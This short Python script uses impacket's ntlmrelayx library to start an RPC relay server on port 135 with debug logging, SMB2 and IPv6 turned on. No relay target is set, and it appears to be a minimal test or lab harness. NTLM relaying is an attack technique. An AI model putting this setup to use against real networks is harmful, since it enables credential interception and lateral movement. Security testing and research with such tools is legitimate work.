#!/usr/bin/python3
import sys 
import logging 
from impacket.examples.ntlmrelayx.servers.rpcrelayserver import RPCRelayServer
from impacket.examples import logger 
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig 
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

logging.getLogger().setLevel(logging.DEBUG)
c = NTLMRelayxConfig()
c.setEncoding(sys.getdefaultencoding())
c.setSMB2Support(True)
c.setListeningPort(135)
c.setInterfaceIp('')
c.setIPv6(True)
s = RPCRelayServer(c)
s.run()